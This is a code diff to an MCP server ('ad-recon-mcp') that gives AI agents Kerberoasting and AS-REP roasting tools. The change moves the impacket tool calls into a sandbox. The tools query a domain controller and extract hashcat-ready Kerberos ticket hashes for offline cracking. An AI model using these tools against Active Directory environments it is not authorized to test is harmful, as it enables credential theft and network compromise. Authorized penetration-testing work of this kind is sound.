@@ -49,7 +49,6 @@ to protect.
 
 import os
 import re
-import shutil
 import subprocess
 import sys
 
@@ -60,23 +59,27 @@ from mcp.server.fastmcp import FastMCP
 
 app = FastMCP("ad-recon-mcp")
 
-# Both the modern (impacket>=0.10) console_scripts entry-point naming and
-# the traditional examples/*.py script naming are tried, in that order --
-# whichever the operator's own impacket install actually provides.
-KERBEROAST_CANDIDATES = ["impacket-getuserspns", "impacket-GetUserSPNs", "GetUserSPNs.py"]
-ASREPROAST_CANDIDATES = ["impacket-getnpusers", "impacket-GetNPUsers", "GetNPUsers.py"]
+# S5 (rootless sandboxing): impacket now runs inside the sandbox image
+# (mcp-servers/sandbox/Dockerfile pip-installs it there), not necessarily
+# on the host -- these are canonical tool names sandbox_runner._TOOL_MAP
+# resolves inside the container, not a host PATH lookup. An earlier
+# version of this file did a host-side shutil.which() pre-check across
+# several possible on-host binary names/aliases (impacket>=0.10's
+# console-script naming vs. the traditional examples/*.py naming) before
+# ever calling run_tool() -- found in review: on a properly-sandboxed
+# machine that deliberately doesn't ALSO have impacket installed locally
+# (the whole point of sandboxing it), that check always failed and these
+# tools always returned "not found" without run_tool()/the sandbox ever
+# being reached. run_tool() itself now fails closed (raises
+# FileNotFoundError) if podman/the image genuinely aren't available --
+# that's the only "not found" signal that still matters.
+KERBEROAST_TOOL = "GetUserSPNs.py"
+ASREPROAST_TOOL = "GetNPUsers.py"
 
 # Impacket's own hashcat-compatible output format for each ticket type --
 # stable, documented, unchanged across releases.
 KERBEROAST_HASH_RE = re.compile(r"\$krb5tgs\$23\$[^\s]+")
 ASREPROAST_HASH_RE = re.compile(r"\$krb5asrep\$23\$[^\s]+")
-
-
-def _find_binary(candidates: list[str]) -> str | None:
-    for name in candidates:
-        if shutil.which(name):
-            return name
-    return None
 
 
 def _build_target(domain: str, username: str, password: str | None, ntlm_hash: str | None) -> tuple[str, str | None]:
@@ -103,10 +106,6 @@ def kerberoast(domain: str, username: str, dc_ip: str,
     account (this account's own privilege level, not the target SPN
     account's) -- Kerberoasting works against any authenticated user by
     design, that's the point of the technique."""
-    binary = _find_binary(KERBEROAST_CANDIDATES)
-    if not binary:
-        return {"error": f"none of {KERBEROAST_CANDIDATES} found on PATH -- pip install impacket"}
-
     target, stdin_input = _build_target(domain, username, password, ntlm_hash)
     args = [target, "-dc-ip", dc_ip, "-request"]
     if ntlm_hash:
@@ -116,11 +115,11 @@ def kerberoast(domain: str, username: str, dc_ip: str,
         kwargs = {"timeout": 60}
         if stdin_input is not None:
             kwargs["input"] = stdin_input
-        result = run_tool(binary, args, **kwargs)
-    except FileNotFoundError:
-        return {"error": f"{binary} not found on PATH -- pip install impacket"}
+        result = run_tool(KERBEROAST_TOOL, args, **kwargs)
+    except FileNotFoundError as e:
+        return {"error": f"sandbox unavailable for {KERBEROAST_TOOL}: {e}"}
     except subprocess.TimeoutExpired:
-        return {"error": f"{binary} timed out after 60s"}
+        return {"error": f"{KERBEROAST_TOOL} timed out after 60s"}
 
     combined = (result.stdout or "") + (result.stderr or "")
     hashes = KERBEROAST_HASH_RE.findall(combined)
@@ -137,9 +136,6 @@ def asreproast(domain: str, dc_ip: str, users_file: str | None = None, username:
     username (check one specific account) or users_file (a path to a
     newline-separated username list -- build one from LDAP/recon output
     first; this tool doesn't enumerate the domain's user list itself)."""
-    binary = _find_binary(ASREPROAST_CANDIDATES)
-    if not binary:
-        return {"error": f"none of {ASREPROAST_CANDIDATES} found on PATH -- pip install impacket"}
     if not username and not users_file:
         return {"error": "provide either username (one account) or users_file (a candidate list)"}
 
@@ -149,11 +145,19 @@ def asreproast(domain: str, dc_ip: str, users_file: str | None = None, username:
         args += ["-usersfile", users_file]
 
     try:
-        result = run_tool(binary, args, timeout=60)
-    except FileNotFoundError:
-        return {"error": f"{binary} not found on PATH -- pip install impacket"}
+        # users_file (if given) is a real host file impacket must read --
+        # explicitly declared via extra_mounts= (S5 sandboxing), or it's
+        # invisible inside the container. See sandbox_runner.build_argv()'s
+        # own docstring for why this must always be an explicit, named
+        # choice rather than auto-detected from args.
+        result = run_tool(
+            ASREPROAST_TOOL, args, timeout=60,
+            extra_mounts=[users_file] if users_file else None,
+        )
+    except FileNotFoundError as e:
+        return {"error": f"sandbox unavailable for {ASREPROAST_TOOL}: {e}"}
     except subprocess.TimeoutExpired:
-        return {"error": f"{binary} timed out after 60s"}
+        return {"error": f"{ASREPROAST_TOOL} timed out after 60s"}
 
     combined = (result.stdout or "") + (result.stderr or "")
     hashes = ASREPROAST_HASH_RE.findall(combined)
